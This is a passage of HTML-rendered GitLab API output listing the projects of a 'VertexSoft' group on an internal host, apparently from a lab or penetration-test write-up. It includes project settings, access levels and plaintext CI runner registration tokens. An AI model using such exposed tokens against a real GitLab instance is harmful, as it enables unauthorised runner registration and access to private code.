            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/members"</span><span class="token punctuation">,</span>
            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/cluster_agents"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:01:32.184Z"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>
        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>
        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>
        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:4\" dir=\"auto\">Hexo&lt;/p>"</span><span class="token punctuation">,</span>
        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:32.535Z"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>
        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941CyxAy3dnsudA95t35ucx"</span><span class="token punctuation">,</span>
        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>
        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>
        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>
                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>
                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>
        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"VertexSoft Internal Employee Service App"</span><span class="token punctuation">,</span>
        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexApp"</span><span class="token punctuation">,</span>
        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / VertexApp"</span><span class="token punctuation">,</span>
        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexapp"</span><span class="token punctuation">,</span>
        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/vertexapp"</span><span class="token punctuation">,</span>
        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:59.905Z"</span><span class="token punctuation">,</span>
        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>
        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/vertexapp.git"</span><span class="token punctuation">,</span>
        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp.git"</span><span class="token punctuation">,</span>
        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp"</span><span class="token punctuation">,</span>
        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp/-/blob/master/README.md"</span><span class="token punctuation">,</span>
        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:59.877Z"</span><span class="token punctuation">,</span>
        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>
            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>
            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>
        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3"</span><span class="token punctuation">,</span>
            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/issues"</span><span class="token punctuation">,</span>
            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/merge_requests"</span><span class="token punctuation">,</span>
            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/repository/branches"</span><span class="token punctuation">,</span>
            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/labels"</span><span class="token punctuation">,</span>
            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/events"</span><span class="token punctuation">,</span>
            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/members"</span><span class="token punctuation">,</span>
            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/cluster_agents"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:01:00.306Z"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>
        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>
        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>
        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:40\" dir=\"auto\">VertexSoft Internal Employee Service App&lt;/p>"</span><span class="token punctuation">,</span>
        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:00.622Z"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>
        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941nmFUY2NxrQoLyDNnGYPx"</span><span class="token punctuation">,</span>
        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>
        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>
        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>
                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>
                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"VertexSoft's old ERP system"</span><span class="token punctuation">,</span>
        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ERP_Old"</span><span class="token punctuation">,</span>
        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / ERP_Old"</span><span class="token punctuation">,</span>
        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"erp_old"</span><span class="token punctuation">,</span>
        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/erp_old"</span><span class="token punctuation">,</span>
        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:05.051Z"</span><span class="token punctuation">,</span>
        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>
        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/erp_old.git"</span><span class="token punctuation">,</span>
        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old.git"</span><span class="token punctuation">,</span>
        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old"</span><span class="token punctuation">,</span>
        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old/-/blob/master/README.md"</span><span class="token punctuation">,</span>
        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
